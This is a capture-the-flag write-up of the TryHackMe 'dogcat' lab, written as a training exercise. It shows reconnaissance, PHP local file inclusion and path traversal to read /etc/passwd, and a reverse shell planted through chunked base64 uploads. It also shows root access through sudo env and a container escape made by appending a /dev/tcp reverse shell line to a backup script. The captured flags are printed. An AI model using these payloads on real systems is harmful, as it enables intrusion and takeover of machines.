# dogcat

```
export IP=10.10.69.207
```

## Task 1 - Dogcat
  ```bash
  jeffrowell@kali:~/Documents/dogcat$ nmap -sC -sV -Pn -n -oN nmap/initial.txt $IP
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-18 21:12 MDT
  Nmap scan report for 10.10.69.207
  Host is up (0.14s latency).
  Not shown: 997 closed ports
  PORT     STATE    SERVICE VERSION
  22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
  |   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
  |_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
  80/tcp   open     http    Apache httpd 2.4.38 ((Debian))
  |_http-server-header: Apache/2.4.38 (Debian)
  |_http-title: dogcat
  9418/tcp filtered git
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 26.83 seconds
  ```

1. What is flag 1?
  ![error_msf](https://user-images.githubusercontent.com/32188816/82281891-bec0e480-994f-11ea-817c-d3f731df28f2.png)

  ```bash
    jeffrowell@kali:~/Documents/dogcat$ curl http://$IP/index.php?view=php://filter/convert.base64-encode/resource=dog
    <!DOCTYPE HTML>
    <html>

    <head>
        <title>dogcat</title>
        <link rel="stylesheet" type="text/css" href="/style.css">
    </head>

    <body>
        <h1>dogcat</h1>
        <i>a gallery of various dogs or cats</i>

        <div>
            <h2>What would you like to see?</h2>
            <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
            Here you go!PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K    </div>
    </body>

    </html>

    ```

  ```bash
  jeffrowell@kali:~/Documents/dogcat$ echo 'PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K' | base64 -d
  <img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
  ```

  ```bash
    jeffrowell@kali:~/Documents/dogcat$ curl http://10.10.69.207/?view=php://filter/convert.base64-encode/resource=dog/../index
    <!DOCTYPE HTML>
    <html>

    <head>
        <title>dogcat</title>
        <link rel="stylesheet" type="text/css" href="/style.css">
    </head>

    <body>
        <h1>dogcat</h1>
        <i>a gallery of various dogs or cats</i>

        <div>
            <h2>What would you like to see?</h2>
            <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
            Here you go!PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==    </div>
    </body>

    </html>
    ```

    ```HTML
      <!DOCTYPE HTML>
      <html>

      <head>
          <title>dogcat</title>
          <link rel="stylesheet" type="text/css" href="/style.css">
      </head>

      <body>
          <h1>dogcat</h1>
          <i>a gallery of various dogs or cats</i>

          <div>
              <h2>What would you like to see?</h2>
              <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
              <?php
                  function containsStr($str, $substr) {
                      return strpos($str, $substr) !== false;
                  }
      	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
                  if(isset($_GET['view'])) {
                      if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                          echo 'Here you go!';
                          include $_GET['view'] . $ext;
                      } else {
                          echo 'Sorry, only dogs or cats are allowed.';
                      }
                  }
              ?>
          </div>
      </body>

      </html>
      ```

      ```python
      #!/usr/bin/python3
      import requests

      url = 'http://10.10.69.207/index.php'
      params = {
          'view': 'cat/../../../../etc/passwd',
          'ext': '',
      }

      r = requests.get(url, params=params)
      print(r.text)
      print(r.url)
      ```

      ```bash
      jeffrowell@kali:~/Documents/dogcat$ ./script.py
      <!DOCTYPE HTML>
      <html>

      <head>
          <title>dogcat</title>
          <link rel="stylesheet" type="text/css" href="/style.css">
      </head>

      <body>
          <h1>dogcat</h1>
          <i>a gallery of various dogs or cats</i>

          <div>
              <h2>What would you like to see?</h2>
              <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
              Here you go!root:x:0:0:root:/root:/bin/bash
      daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
      bin:x:2:2:bin:/bin:/usr/sbin/nologin
      sys:x:3:3:sys:/dev:/usr/sbin/nologin
      sync:x:4:65534:sync:/bin:/bin/sync
      games:x:5:60:games:/usr/games:/usr/sbin/nologin
      man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
      lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
      mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
      news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
      uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
      proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
      www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
      backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
      list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
      irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
      gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
      nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
      _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
          </div>
      </body>

      </html>

      http://10.10.69.207/index.php?view=cat%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&ext=
      ```

2. What is flag 2?
  ```bash
  jeffrowell@kali:~/Documents/dogcat$ ./script.py
  echo "PD9waHAKLy8gcGhwLXJldmVyc2Utc2hlbGwgLSBBIFJldmVyc2UgU2hlbGwgaW1wbGVtZW50YXRp" >> revshell_b64
  echo "b24gaW4gUEhQCi8vIENvcHlyaWdodCAoQykgMjAwNyBwZW50ZXN0bW9ua2V5QHBlbnRlc3Rtb25r" >> revshell_b64
  echo "ZXkubmV0Ci8vCi8vIFRoaXMgdG9vbCBtYXkgYmUgdXNlZCBmb3IgbGVnYWwgcHVycG9zZXMgb25s" >> revshell_b64
  echo "eS4gIFVzZXJzIHRha2UgZnVsbCByZXNwb25zaWJpbGl0eQovLyBmb3IgYW55IGFjdGlvbnMgcGVy" >> revshell_b64
  echo "Zm9ybWVkIHVzaW5nIHRoaXMgdG9vbC4gIFRoZSBhdXRob3IgYWNjZXB0cyBubyBsaWFiaWxpdHkK" >> revshell_b64
  echo "Ly8gZm9yIGRhbWFnZSBjYXVzZWQgYnkgdGhpcyB0b29sLiAgSWYgdGhlc2UgdGVybXMgYXJlIG5v" >> revshell_b64

                                                      .
                                                      .
                                                      .
                                                      .
                                                      .
                                                      .

  echo "aW9uIHByaW50aXQgKCRzdHJpbmcpIHsKCWlmICghJGRhZW1vbikgewoJCXByaW50ICIkc3RyaW5n" >> revshell_b64
  echo "XG4iOwoJfQp9Cgo/Pgo=" >> revshell_b64
  jeffrowell@kali:~/Documents/dogcat$
  ```

  ```bash
  jeffrowell@kali:~/Documents/dogcat$ nc -lvp 9999
  listening on [any] 9999 ...
  10.10.46.63: inverse host lookup failed: Unknown host
  connect to [10.8.21.42] from (UNKNOWN) [10.10.46.63] 57464
  Linux e8687be1d5ff 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
   07:12:21 up 11 min,  0 users,  load average: 0.36, 1.16, 1.08
  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /bin/sh: 0: can't access tty; job control turned off
  $ find / -name "flag2*" 2>/dev/null
  /var/www/flag2_QMW7JvaY2LvK.txt
  $ cat /var/www/flag2_QMW7JvaY2LvK.txt
  THM{LF1_t0_RC3_aec3fb}
  ```

3. What is flag 3?
```bash
  $ sudo -l
  Matching Defaults entries for www-data on e8687be1d5ff:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

  User www-data may run the following commands on e8687be1d5ff:
      (root) NOPASSWD: /usr/bin/env
  ```

  ```bash
  $ sudo env /bin/sh

  id
  uid=0(root) gid=0(root) groups=0(root)
  ```

  ```bash
  cd /root
  cat flag3.txt
  THM{D1ff3r3nt_3nv1ronments_874112}
  ```


4. What is flag 4?

  `linpeas` output:

  ```bash
  [+] Looking for Signature verification failed in dmseg
   Not Found

  [+] selinux enabled? .............. sestatus Not Found
  [+] Printer? ...................... lpstat Not Found
  [+] Is this a container? .......... Looks like we're in a Docker container
  [+] Is ASLR enabled? .............. Yes
  ```

  ```bash
  cd /opt/
  ls -alh
  total 12K
  drwxr-xr-x 1 root root 4.0K May 19 07:03 .
  drwxr-xr-x 1 root root 4.0K May 19 07:03 ..
  drwxr-xr-x 3 root root 4.0K May 19 07:35 backups
  cd backups
  ls
  backup.sh
  backup.tar
  cat backup.sh
  #!/bin/bash
  tar cf /root/container/backup/backup.tar /root/container

  echo "bash -i >& /dev/tcp/10.8.21.42/3333 0>&1" >> backup.sh

  cat backup.sh
  #!/bin/bash
  tar cf /root/container/backup/backup.tar /root/container
  bash -i >& /dev/tcp/10.8.21.42/3333 0>&1
  ```

  ```bash
  jeffrowell@kali:~/Documents/dogcat$ nc -lvp 3333
  listening on [any] 3333 ...
  10.10.46.63: inverse host lookup failed: Unknown host
  connect to [10.8.21.42] from (UNKNOWN) [10.10.46.63] 45146
  bash: cannot set terminal process group (9742): Inappropriate ioctl for device
  bash: no job control in this shell
  root@dogcat:~# ls
  ls
  container
  flag4.txt
  root@dogcat:~# cat flag4.txt
  cat flag4.txt
  THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
  root@dogcat:~#
```
